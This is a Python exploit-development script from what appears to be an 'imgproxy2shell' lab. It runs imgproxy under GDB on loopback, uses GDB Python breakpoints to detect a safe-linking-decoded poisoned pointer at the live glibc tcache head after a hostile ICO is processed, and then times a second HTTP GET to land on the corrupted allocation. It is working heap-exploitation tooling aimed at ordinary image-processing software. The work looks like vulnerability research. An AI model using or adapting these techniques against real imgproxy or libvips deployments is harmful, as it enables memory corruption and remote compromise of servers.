#!/usr/bin/env python3
"""W12: gate a second natural GET on GDB observing the wire-decoded head.

Loopback only. Same probe as W9; only the GDB script and post-hostile sleep
differ. Plain GDB command lists skip commands after `finish`, so the malloc
return and tcache head are observed here by GDB Python breakpoints: an entry
breakpoint at malloc(0x20) installs a temporary breakpoint at that call's
return address; both return False (never stop the inferior) and only print
state. A marker file is touched when the decoded wire pointer is seen at the
live tcache head; the Python side polls that file and sends a benign GET to
the same imgproxy process immediately. GDB writes no inferior memory and
forces no call. Values are read with `p/x` text because this GDB's Python API
rejects casts from pointer-typed registers.

Usage:
    W8_OUTDIR=/tmp/out python3 ico_second_get_gated_py.py TAG LOW N PRELOAD gdb SIZE BINARY
"""
import http.client
import importlib.util
import os
import sys
import time

PROBE = ("/home/mesh-home/mishe-tauftauf2shell/lab/frontier/imgproxy2shell/"
         "provision/ico_post_poison_trace.py")
TAG = sys.argv[1]
MARKER = f"/tmp/w12-{TAG}-poison.marker"
if os.path.exists(MARKER):
    os.unlink(MARKER)

PY = """
import gdb, re, sys
MARKER = "{marker}"

def out(fmt, *args):
    sys.stdout.write(fmt % args + "\\n")
    sys.stdout.flush()


def num(expr):
    text = gdb.execute("p/x " + expr, to_string=True)
    return int(re.search(r"0x[0-9a-fA-F]+", text).group(0), 16)


wire = num("$wire")
fired = False
out("GDB_WIRE_NUM %#x", wire)

def state():
    return (num("$rax"), num("tcache->entries[1]"), num("tcache->counts[1]"),
            num("$_thread"), num("tcache"))

pending = []

class ReturnFB(gdb.FinishBreakpoint):
    def stop(self):
        global fired
        rax, head, cnt, th, tc = state()
        out("GDB_MALLOC_RET %#x WIRE=%d thread=%d tcache=%#x head=%#x count=%d",
            rax, int(rax == wire), th, tc, head, cnt)
        if not fired and head == wire:
            fired = True
            out("GDB_POISON_HEAD_LIVE thread=%d head=%#x count=%d", th, head, cnt)
            open(MARKER, "w").close()
        return False

class EntryBP(gdb.Breakpoint):
    def stop(self):
        if num("$rdi") != 0x20:
            return False
        _, head, cnt, th, tc = state()
        out("GDB_MALLOC_HIT thread=%d tcache=%#x head=%#x count=%d", th, tc, head, cnt)
        pending.append(ReturnFB(internal=True))
        return False

EntryBP("malloc", internal=True)
"""

GDB = """set pagination off
set confirm off
set breakpoint pending on
handle SIGPIPE nostop noprint pass
set environment IMGPROXY_BIND 127.0.0.1:18180
set environment IMGPROXY_BASE_URL http://127.0.0.1:18181/
set environment IMGPROXY_WORKERS 1
set environment IMGPROXY_CONCURRENCY 1
set environment IMGPROXY_LOG_LEVEL error
set environment IMGPROXY_ALLOW_LOOPBACK_SOURCE_ADDRESSES true
set environment LD_LIBRARY_PATH {libdir}
break vips_foreign_load_read_full if $rdx == 0xfffffff5
run
printf "GDB_HIT rdx=%p\\n", $rdx
set $dst = $rsi
finish
set $pos = $dst + 18
set $raw = *(unsigned long long *)$pos
set $wire = (void *)($raw ^ ((unsigned long)$pos >> 12))
printf "GDB_WIRE_DECODED %p RAW %p POS %p\\n", $wire, $raw, $pos
printf "GDB_TCACHE_PRE head=%p count=%d thread=%d tcache=%p\\n", tcache->entries[1], tcache->counts[1], $_thread, tcache
python
""" + PY.format(marker=MARKER) + """end
continue
printf "GDB_AFTER_CONTINUE\\n"
quit
"""

spec = importlib.util.spec_from_file_location("w9probe", PROBE)
mod = importlib.util.module_from_spec(spec)
spec.loader.exec_module(mod)
GOMAXPROCS = os.environ.get("W12_GOMAXPROCS")
if GOMAXPROCS:
    mod.GDB = GDB.replace("set environment IMGPROXY_BIND",
                          f"set environment GOMAXPROCS {GOMAXPROCS}\n"
                          "set environment IMGPROXY_BIND")
    os.environ["GOMAXPROCS"] = GOMAXPROCS

real_sleep = time.sleep
real_popen = mod.subprocess.Popen
proc_box = []


def popen(*args, **kwargs):
    p = real_popen(*args, **kwargs)
    proc_box.append(p)
    return p


mod.subprocess.Popen = popen


def sleep_with_gated_second_request(sec):
    if sec == 0.3:
        deadline = time.monotonic() + 5
        fired = False
        while time.monotonic() < deadline:
            if os.path.exists(MARKER):
                fired = True
                break
            if proc_box and proc_box[0].poll() is not None:
                break
            real_sleep(0.002)
        print(f"W12 tag={TAG} poison_marker={fired}", flush=True)
        try:
            conn = http.client.HTTPConnection("127.0.0.1", 18180, timeout=8)
            conn.request("GET", "/insecure/rs:fill:16:16/plain/benign.ico",
                         headers={"Host": "127.0.0.1"})
            resp = conn.getresponse()
            print(f"W12 tag={TAG} second status={resp.status} "
                  f"len={len(resp.read(200))}", flush=True)
            conn.close()
        except Exception as exc:
            print(f"W12 tag={TAG} second {type(exc).__name__}: {exc}",
                  flush=True)
        real_sleep(0.6)
        if proc_box and proc_box[0].poll() is None:
            proc_box[0].kill()
    return real_sleep(sec)


mod.time.sleep = sleep_with_gated_second_request
sys.exit(mod.main())
